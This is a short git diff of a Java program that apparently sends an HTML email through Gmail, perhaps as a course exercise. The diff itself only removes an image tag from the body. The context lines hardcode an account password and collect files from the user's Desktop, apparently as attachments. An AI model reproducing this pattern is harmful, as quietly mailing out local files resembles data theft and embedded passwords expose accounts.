@@ -20,7 +20,7 @@ public class Main {
 		final String fromEmail = "iamsegsoctrustme@gmail.com"; //requires valid gmail id
 		final String pass = "segsoc123"; // correct password for gmail id
 		String header = "Soy er kbsero";
-		String body = "<H1>Soy tu cuerpesito papuh</H1><img src=\"C:\\Users\\josag\\Desktop.\\images.jpg\">";
+		String body = "<H1>Soy tu cuerpesito papuh</H1>";
 		ArrayList<String> paths = new ArrayList<>();
 		paths.add(System.getProperty("user.home") + "/Desktop/AndroidManifest.xml");
 		paths.add(System.getProperty("user.home") + "/Desktop/gato felis.jpg");
